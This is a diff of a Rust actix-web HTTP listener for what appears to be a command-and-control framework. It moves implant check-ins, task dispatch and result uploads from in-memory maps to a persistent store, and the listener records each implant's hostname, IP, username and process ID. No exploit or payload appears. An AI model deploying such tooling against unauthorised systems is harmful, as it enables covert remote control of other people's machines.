@@ -1,49 +1,41 @@
 use actix_web::{web, App, HttpResponse, HttpServer, Responder};
-use std::collections::HashMap;
 use std::net::SocketAddr;
-use std::sync::{
-    atomic::{AtomicBool, Ordering},
-    Arc, Mutex, RwLock,
-};
-use std::time::{Duration, SystemTime};
+use std::sync::atomic::{AtomicBool, Ordering};
+use std::sync::Arc;
+use std::time::SystemTime;
 use tokio::sync::oneshot;
 use tokio::task::JoinHandle;
 use uuid::Uuid;
 
-use crate::listener::*;
 use crate::message::*;
-use crate::session::SessionManager;
+use crate::store::Store;
 use crate::task::*;
-
-// Server state
-pub struct ServerState {
-    pub implants: Arc<Mutex<HashMap<Uuid, ImplantInfo>>>,
-}
 
 pub struct HttpListener {
     name: String,
     id: Uuid,
     addr: SocketAddr,
-    session_manager: Arc<RwLock<SessionManager>>,
+    store: Arc<dyn Store>,
     running: Arc<AtomicBool>,
     shutdown_tx: Option<oneshot::Sender<()>>,
     handle: Option<JoinHandle<()>>,
-    state: Arc<ServerState>,
 }
 
 impl HttpListener {
-    pub fn new(name: &str, addr: SocketAddr, session_manager: Arc<RwLock<SessionManager>>) -> Self {
+    pub fn new(name: &str, addr: SocketAddr, store: Arc<dyn Store>) -> Self {
+        Self::with_id(Uuid::new_v4(), name, addr, store)
+    }
+
+    /// Restore a listener with a known ID. Used when rebuilding persisted listeners on startup.
+    pub fn with_id(id: Uuid, name: &str, addr: SocketAddr, store: Arc<dyn Store>) -> Self {
         HttpListener {
             name: name.to_string(),
-            id: Uuid::new_v4(),
+            id,
             addr,
-            session_manager,
+            store,
             running: Arc::new(AtomicBool::new(false)),
             shutdown_tx: None,
             handle: None,
-            state: Arc::new(ServerState {
-                implants: Arc::new(Mutex::new(HashMap::new())),
-            }),
         }
     }
 
@@ -59,10 +51,6 @@ impl HttpListener {
         self.id
     }
 
-    pub fn get_state(&self) -> Arc<ServerState> {
-        self.state.clone()
-    }
-
     pub fn start(&mut self) -> Result<(), String> {
         // Don't start if already running
         if self.running.load(Ordering::SeqCst) {
@@ -76,8 +64,7 @@ impl HttpListener {
         let listener_data = web::Data::new(ListenerData {
             name: listener_name.clone(),
             id: listener_id,
-            state: self.state.clone(),
-            session_manager: self.session_manager.clone(),
+            store: self.store.clone(),
         });
 
         // Bind the socket synchronously so bind errors are reported to the caller instead of
@@ -174,26 +161,6 @@ impl HttpListener {
     pub fn is_running(&self) -> bool {
         self.running.load(Ordering::SeqCst)
     }
-
-    // Helper method to clean up stale implants
-    pub fn cleanup_stale_implants(&self, timeout: Duration) -> usize {
-        let now = SystemTime::now();
-        let mut implants = self.state.implants.lock().unwrap();
-
-        let stale_ids: Vec<Uuid> = implants
-            .iter()
-            .filter_map(|(id, implant)| match implant.last_seen.elapsed() {
-                Ok(elapsed) if elapsed > timeout => Some(*id),
-                _ => None,
-            })
-            .collect();
-
-        for id in &stale_ids {
-            implants.remove(id);
-        }
-
-        stale_ids.len()
-    }
 }
 
 async fn index(data: web::Data<ListenerData>) -> impl Responder {
@@ -206,17 +173,26 @@ async fn implant_checkin(
     data: web::Data<ListenerData>,
 ) -> impl Responder {
     let now = SystemTime::now();
-    let mut implants = data.state.implants.lock().unwrap();
 
-    // Check if this is a new implant or an existing one
-    let implant_id = if let Some(id) = checkin.id {
-        // Existing implant - update last_seen
-        if let Some(implant) = implants.get_mut(&id) {
-            implant.last_seen = now;
-            implant.ip_address = checkin.ip_address.clone();
+    let implant_id = match checkin.id {
+        // Existing implant - refresh its record.
+        Some(id) if data.store.get_implant(&id).is_some() => {
+            if let Some(mut implant) = data.store.get_implant(&id) {
+                implant.hostname = checkin.hostname.clone();
+                implant.ip_address = checkin.ip_address.clone();
+                implant.os_info = checkin.os_info.clone();
+                implant.username = checkin.username.clone();
+                implant.process_id = checkin.process_id;
+                implant.last_seen = now;
+                if let Err(e) = data.store.upsert_implant(implant) {
+                    log::error!("Failed to update implant {}: {}", id, e);
+                    return HttpResponse::InternalServerError().body("failed to store implant");
+                }
+            }
             id
-        } else {
-            // ID provided but not found - register as new
+        }
+        // New implant - register it and open a session.
+        _ => {
             let new_id = Uuid::new_v4();
             let implant_info = ImplantInfo {
                 id: new_id,
@@ -228,43 +204,20 @@ async fn implant_checkin(
                 first_seen: now,
                 last_seen: now,
             };
-            implants.insert(new_id, implant_info);
-
-            // Create a new session
-            let mgr = data.session_manager.write().unwrap();
-            mgr.create_session(
+            if let Err(e) = data.store.upsert_implant(implant_info) {
+                log::error!("Failed to store implant {}: {}", new_id, e);
+                return HttpResponse::InternalServerError().body("failed to store implant");
+            }
+            if let Err(e) = data.store.create_session(
                 new_id,
                 checkin.hostname.to_string(),
                 checkin.ip_address.to_string(),
-            );
-
+            ) {
+                log::error!("Failed to create session for {}: {}", new_id, e);
+                return HttpResponse::InternalServerError().body("failed to create session");
+            }
             new_id
         }
-    } else {
-        // New implant - register
-        let new_id = Uuid::new_v4();
-        let implant_info = ImplantInfo {
-            id: new_id,
-            hostname: checkin.hostname.clone(),
-            ip_address: checkin.ip_address.clone(),
-            os_info: checkin.os_info.clone(),
-            username: checkin.username.clone(),
-            process_id: checkin.process_id,
-            first_seen: now,
-            last_seen: now,
-        };
-
-        implants.insert(new_id, implant_info);
-
-        // Create a new session
-        let mgr = data.session_manager.write().unwrap();
-        mgr.create_session(
-            new_id,
-            checkin.hostname.to_string(),
-            checkin.ip_address.to_string(),
-        );
-
-        new_id
     };
 
     log::info!("implant check-in: {}", implant_id);
@@ -282,44 +235,31 @@ async fn get_tasks(path: web::Path<String>, data: web::Data<ListenerData>) -> im
         Err(_) => return HttpResponse::BadRequest().body("Invalid implant ID"),
     };
 
-    // Update last_seen
-    {
-        let mut implants = data.state.implants.lock().unwrap();
-        if let Some(implant) = implants.get_mut(&implant_id) {
-            implant.last_seen = SystemTime::now();
-        } else {
-            return HttpResponse::NotFound().body("implant not found");
-        }
+    if data.store.get_implant(&implant_id).is_none() {
+        return HttpResponse::NotFound().body("implant not found");
+    }
+    if let Err(e) = data.store.touch_implant(&implant_id) {
+        log::error!("Failed to touch implant {}: {}", implant_id, e);
     }
 
-    // Get session manager and find tasks for this implant
-    let session_manager = data.session_manager.read().unwrap();
-
-    // Find session ID from implant ID
-    let session_id = match session_manager.get_session_id_by_implant(&implant_id) {
-        Ok(id) => id,
-        Err(_) => return HttpResponse::NotFound().body("No session found for implant"),
+    let session_id = match data.store.session_id_for_implant(&implant_id) {
+        Some(id) => id,
+        None => return HttpResponse::NotFound().body("No session found for implant"),
     };
+
+    // The implant is alive, so (re)mark its session active. This also restores sessions that were
+    // marked disconnected when the server restarted.
+    if let Err(e) = data.store.activate_session(&session_id) {
+        log::error!("Failed to activate session {}: {}", session_id, e);
+    }
 
     // Get pending tasks and mark them as in progress
-    let session = match session_manager.get_session(&session_id) {
-        Some(s) => s,
-        None => return HttpResponse::NotFound().body("Session not found"),
-    };
+    let pending_tasks = data.store.list_pending_tasks(session_id);
 
-    let pending_tasks = match session.get_pending_tasks_for_session(session_id) {
-        Ok(tasks) => tasks,
-        Err(_) => return HttpResponse::InternalServerError().body("Error fetching tasks"),
-    };
-
-    // Mark tasks as in progress
     for task in &pending_tasks {
-        match session.update_task_status(&task.id, crate::task::TaskStatus::InProgress) {
-            Ok(_) => {}
-            Err(e) => {
-                log::error!("Error updating task status: {}", e);
-                return HttpResponse::InternalServerError().body("Error updating task status");
-            }
+        if let Err(e) = data.store.set_task_status(&task.id, TaskStatus::InProgress) {
+            log::error!("Error updating task status: {}", e);
+            return HttpResponse::InternalServerError().body("Error updating task status");
         }
     }
 
@@ -333,32 +273,27 @@ async fn upload_results(
 ) -> impl Responder {
     let task_result = result.into_inner();
 
-    // Use session manager to submit the result
-    let session_manager = data.session_manager.read().unwrap();
-    let session = match session_manager.get_session(&task_result.session_id) {
-        Some(s) => s,
-        None => return HttpResponse::NotFound().body("Session not found"),
-    };
-    match session.submit_task_result(task_result) {
+    if data.store.get_session(&task_result.session_id).is_none() {
+        return HttpResponse::NotFound().body("Session not found");
+    }
+
+    match data.store.submit_result(task_result) {
         Ok(_) => HttpResponse::Ok().json(serde_json::json!({
             "status": "success",
             "message": "Task result received"
         })),
-        Err(e) => HttpResponse::BadRequest().body(e),
+        Err(e) => HttpResponse::BadRequest().body(e.to_string()),
     }
 }
 
 // List all active implants
 async fn list_implants(data: web::Data<ListenerData>) -> impl Responder {
-    let implants = data.state.implants.lock().unwrap();
-    let implant_list: Vec<ImplantInfo> = implants.values().cloned().collect();
-    HttpResponse::Ok().json(implant_list)
+    HttpResponse::Ok().json(data.store.list_implants())
 }
 
 // Shared data structure for route handlers
 struct ListenerData {
     name: String,
     id: Uuid,
-    state: Arc<ServerState>,
-    session_manager: Arc<RwLock<SessionManager>>,
+    store: Arc<dyn Store>,
 }
